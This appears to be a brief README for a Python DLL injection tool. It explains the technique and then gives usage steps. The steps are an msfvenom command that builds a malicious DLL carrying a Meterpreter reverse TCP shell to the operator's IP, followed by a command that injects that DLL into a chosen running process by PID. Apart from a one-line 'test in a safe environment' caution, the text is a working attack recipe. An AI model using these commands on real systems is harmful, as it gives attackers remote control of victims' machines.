DLL Injection is a technique that consist of injecting a Dll (Legitimate or malicious) in a running process.. And it is something that we see everywhere.

To use the Dllinjection.py program: 

1) generate a malicious dll using metasploit msfvenom:
  - msfvenom -p windows/meterpreter/reverse_tcp lhost=(your Ip) lport=9000 -f dll > dll_injection.dll 
  - Note: you can call your output file what ever you want.
  
2) run the python program:
  "C:\Python27\python.exe" dllinjection.py PID_to_inject Your_Dll
  
Test this in a safe environement.
